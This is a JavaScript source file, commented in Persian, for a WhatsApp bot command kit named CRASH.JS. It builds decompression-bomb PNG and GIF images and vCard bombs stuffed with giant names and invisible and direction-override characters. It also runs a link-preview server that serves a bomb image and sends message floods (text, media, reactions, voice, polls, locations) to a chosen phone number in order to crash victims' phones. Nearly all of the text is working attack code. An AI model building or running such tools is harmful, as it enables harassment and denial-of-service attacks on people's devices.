// =======================
// CRASH.JS v5 — MEGA-FINAL KIT (اندروید + iOS)
//
// حالت‌ها:
//   !crash total [extreme] [n] [شماره]
//   !crash mega [extreme] [شماره]      → PNG بمب + GIF بمب + سند + vCard
//   !crash png [شماره]                 → تک تصویر بمب 12000×12000 (432MB دیکد)
//   !crash gif [شماره]                 → GIF بمب صفحه‌منطقی 65535² (~17GB دیکد)
//   !crash vcard [شماره]               → vCard بمب (120 مخاطب، نام 4000 کاراکتری)
//   !crash contacts [شماره]            → پیام مخاطبین بومی با نام‌های غول‌پیکر
//   !crash link [شماره]                → لینک‌پریویو بمب (نیاز به تانل روشن)
//   !crash flood <n> [شماره]           → فلاد متنی (ارسال همزمان ۳تایی)
//   !crash media <n> [شماره]           → فلاد بمب تصویری
//   !crash quote <n> [شماره]           → فلاد نقل‌قول غول‌پیکر
//   !crash react <n> [شماره]           → فلاد ریکشن
//   !crash voice <n> [شماره]           → فلاد وویس (WAV)
//   !crash poll <n> [شماره]            → فلاد نظرسنجی
//   !crash loc <n> [شماره]             → فلاد مکان
//   !crash doc [شماره]                 → سند ۲MB
//   !crash stop                        → توقف فوری همه حلقه‌ها
//   !crash list
//
// حالت extreme → تصاویر 22000² (1.9GB) + GIF فریم واقعی + دورهای بیشتر
// =======================

import http from "http";
import zlib from "zlib";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let STOP = false;

// ---------- ابزار شماره ----------
const isPhone = (a) => typeof a === "string" && /^\d{8,15}$/.test(a);
const toJid = (n) => n.replace(/\D/g, "") + "@s.whatsapp.net";

function extractTarget(args) {
  const idx = args.findIndex(isPhone);
  if (idx === -1) return { target: null, rest: args };
  return {
    target: toJid(args[idx]),
    rest: [...args.slice(0, idx), ...args.slice(idx + 1)],
  };
}

async function sendTo(sock, target, content, from) {
  const to = target || from;
  try {
    return await sock.sendMessage(to, content);
  } catch (e) {
    console.log("CRASH SEND ERROR:", to, e.message);
    return null;
  }
}

// ارسال دسته‌ای همزمان (فشار بیشتر، زمان کمتر)
async function batchSend(sock, target, makeContent, count, gap = 120, from) {
  let ok = 0;
  for (let i = 0; i < count; i += 3) {
    if (STOP) break;
    const batch = [];
    for (let j = i; j < Math.min(i + 3, count); j++) {
      batch.push(sendTo(sock, target, makeContent(j), from));
    }
    const res = await Promise.all(batch);
    ok += res.filter(Boolean).length;
    if (gap) await sleep(gap);
  }
  return ok;
}

// ---------- PNG بمب (فایل کوچک، دیکد عظیم) ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32(buf) {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}
const pngChunk = (type, data) => {
  const t = Buffer.from(type);
  const out = Buffer.alloc(12 + data.length); // نه 8
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  out.writeUInt32BE(crc32(Buffer.concat([t, data])), 8 + data.length);
  return out;
};

function makeBombPng(w, h, rgb) {
  return new Promise((resolve, reject) => {
    const row = Buffer.alloc(1 + w * 3);
    for (let x = 0; x < w; x++) {
      row[1 + x * 3] = rgb[0];
      row[1 + x * 3 + 1] = rgb[1];
      row[1 + x * 3 + 2] = rgb[2];
    }
    const d = new zlib.Deflate({ level: 9 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", reject);
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0);
        ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8;
        ihdr[9] = 2;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        resolve(Buffer.concat([sig, pngChunk("IHDR", ihdr), pngChunk("IDAT", Buffer.concat(out)), pngChunk("IEND", Buffer.alloc(0))]));
      } catch (e) { reject(e); }
    });
    (function push(y) {
      if (y >= h) return d.end();
      const up = Math.min(y + 200, h);
      for (; y < up; y++) d.write(row);
      setImmediate(() => push(y));
    })(0);
  });
}

const pngCache = new Map();
async function getPng(w, h, color) {
  const key = `${w}x${h}#${color.join(",")}`;
  if (!pngCache.has(key)) {
    console.log("CRASH: ساخت PNG بمب", w, "x", h, "(دیکد ~" + Math.round(w * h * 3 / 1e6) + "MB)...");
    pngCache.set(key, await makeBombPng(w, h, color));
  }
  return pngCache.get(key);
}

// ---------- GIF بمب (LZW خالص — بدون وابستگی) ----------
// انکودر LZW برای رنگ یکدست با دیکشنری Uint32 (سریع، بدون آرایه عظیم)
function encodeSolidGif(minCodeSize, totalPixels) {
  const clear = 1 << minCodeSize;
  const eoi = clear + 1;
  let codeSize = minCodeSize + 1;
  let nextCode = eoi + 1;
  const dict = new Uint32Array(4096 * 256).fill(0xFFFFFFFF);
  const bits = [];
  const wc = (code) => { for (let i = 0; i < codeSize; i++) bits.push((code >> i) & 1); };
  wc(clear);
  wc(0); // پیکسل اول (رنگ 0)
  let consumed = 1, cur = 0;
  while (consumed < totalPixels) {
    const key = cur * 256;
    if (dict[key] !== 0xFFFFFFFF) {
      cur = dict[key];
    } else {
      wc(cur);
      dict[key] = nextCode++;
      if (nextCode >= 1 << codeSize) {
        if (codeSize < 12) codeSize++;
        else {
          wc(clear);
          dict.fill(0xFFFFFFFF);
          codeSize = minCodeSize + 1;
          nextCode = eoi + 1;
        }
      }
      cur = 0;
    }
    consumed++;
  }
  wc(cur);
  wc(eoi);
  const bytes = [];
  for (let i = 0; i < bits.length; i += 8) {
    let b = 0;
    for (let j = 0; j < 8; j++) b |= (bits[i + j] || 0) << j;
    bytes.push(b);
  }
  return bytes;
}

// بمب صفحه منطقی: فایل ۴۰ بایتی، صفحه 65535² → دیکد ~17GB
function makeGifScreenBomb() {
  const lsd = Buffer.alloc(7);
  lsd.writeUInt16LE(65535, 0);
  lsd.writeUInt16LE(65535, 2);
  lsd[4] = 0x80; // GCT: 2 رنگ
  lsd[5] = 0; lsd[6] = 0;
  const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
  const imgDesc = Buffer.alloc(10);
  imgDesc[0] = 0x2C;
  imgDesc.writeUInt16LE(0, 1);
  imgDesc.writeUInt16LE(0, 3);
  imgDesc.writeUInt16LE(1, 5);
  imgDesc.writeUInt16LE(1, 7);
  imgDesc[9] = 0;
  const data = encodeSolidGif(2, 1);
  return Buffer.concat([
    Buffer.from("GIF89a"), lsd, gct, imgDesc,
    Buffer.from([2]), Buffer.from([data.length]), Buffer.from(data), Buffer.from([0]),
    Buffer.from([0x3B]),
  ]);
}

// بمب فریم واقعی: ابعاد واقعی سنگین (فقط extreme)
const gifFrameCache = new Map();
async function getGifFrameBomb(w, h) {
  const key = `${w}x${h}`;
  if (!gifFrameCache.has(key)) {
    console.log("CRASH: ساخت GIF بمب", w, "x", h, "(دیکد ~" + Math.round(w * h * 4 / 1e6) + "MB)...");
    const data = encodeSolidGif(2, w * h);
    const lsd = Buffer.alloc(7);
    lsd.writeUInt16LE(w % 65536, 0);
    lsd.writeUInt16LE(h % 65536, 2);
    lsd[4] = 0x80;
    lsd[5] = 0; lsd[6] = 0;
    const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
    const imgDesc = Buffer.alloc(10);
    imgDesc[0] = 0x2C;
    imgDesc.writeUInt16LE(0, 1);
    imgDesc.writeUInt16LE(0, 3);
    imgDesc.writeUInt16LE(w % 65536, 5);
    imgDesc.writeUInt16LE(h % 65536, 7);
    imgDesc[9] = 0;
    const subs = [];
    for (let i = 0; i < data.length; i += 255) {
      const n = Math.min(255, data.length - i);
      subs.push(Buffer.from([n]), Buffer.from(data.slice(i, i + n)));
    }
    subs.push(Buffer.from([0]));
    gifFrameCache.set(key, Buffer.concat([
      Buffer.from("GIF89a"), lsd, gct, imgDesc,
      Buffer.from([2]), ...subs, Buffer.from([0x3B]),
    ]));
  }
  return gifFrameCache.get(key);
}

// ---------- WAV (وویس) ----------
function makeWav(seconds, sampleRate = 8000) {
  const n = sampleRate * seconds;
  const data = Buffer.alloc(n * 2);
  const hdr = Buffer.alloc(44);
  hdr.write("RIFF", 0); hdr.writeUInt32LE(36 + data.length, 4); hdr.write("WAVE", 8);
  hdr.write("fmt ", 12); hdr.writeUInt32LE(16, 16); hdr.writeUInt16LE(1, 20);
  hdr.writeUInt16LE(1, 22); hdr.writeUInt32LE(sampleRate, 24);
  hdr.writeUInt32LE(sampleRate * 2, 28); hdr.writeUInt16LE(2, 32); hdr.writeUInt16LE(16, 34);
  hdr.write("data", 36); hdr.writeUInt32LE(data.length, 40);
  return Buffer.concat([hdr, data]);
}

// ---------- vCard بمب ----------
const nameParts = ["محمد", "علی", "احمد", "حسین", "رضا", "مهدی"];
function giantName(len) {
  let s = "";
  while (s.length < len) s += nameParts[(Math.random() * nameParts.length) | 0] + "\u200B\u0651\u064E\u0650\u202E\uFE0F";
  return s.slice(0, len);
}
function makeVcardBomb(count = 120, nameLen = 4000) {
  let out = "";
  for (let i = 0; i < count; i++) {
    const nm = giantName(nameLen);
    out += "BEGIN:VCARD\nVERSION:3.0\nN:" + nm + ";;;\nFN:" + nm + "\nTEL;TYPE=CELL:+93794394088\nEND:VCARD\n";
  }
  return Buffer.from(out, "utf8");
}

// ---------- سرور لینک‌پریویو بمب ----------
const PUBLIC_BASE = process.env.CAM_URL || "http://localhost:8080";
let linkServer = null;
const LINK_PORT = 8082;

function startLinkServer() {
  if (linkServer) return;
  linkServer = http.createServer(async (req, res) => {
    try {
      if (req.url === "/bomb.png") {
        const img = await getPng(12000, 12000, [255, 0, 0]);
        res.writeHead(200, { "Content-Type": "image/png", "Cache-Control": "no-store" });
        res.end(img);
        return;
      }
      if (req.url === "/p") {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(`<!DOCTYPE html><html><head><meta property="og:title" content="Photo">
<meta property="og:image" content="${PUBLIC_BASE}/bomb.png">
<meta property="og:image:width" content="12000"><meta property="og:image:height" content="12000">
</head><body>ok</body></html>`);
        return;
      }
      res.writeHead(404); res.end("nf");
    } catch (e) { res.writeHead(500); res.end("err"); }
  });
  linkServer.listen(LINK_PORT, "0.0.0.0", () => console.log("LINK SERVER:", LINK_PORT));
}

